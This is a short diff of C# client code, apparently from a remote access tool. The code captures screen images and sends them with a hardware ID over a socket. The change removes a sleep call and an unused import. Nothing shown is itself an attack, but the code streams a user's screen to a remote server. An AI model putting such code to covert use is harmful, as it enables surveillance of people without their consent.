@@ -1,6 +1,5 @@
 ﻿using System;
 using System.IO;
-using System.Threading;
 using System.Drawing.Imaging;
 using System.Drawing;
 using System.Windows.Forms;
@@ -75,9 +74,8 @@ namespace Client.Handle_Packet
                             msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                             msgpack.ForcePathObject("ID").AsString = hwid;
                             msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
-                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(System.Windows.Forms.Screen.AllScreens.Length);
+                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
                             tempSocket.Send(msgpack.Encode2Bytes());
-                            Thread.Sleep(1);
                         }
                     }
                     bmp.UnlockBits(bmpData);
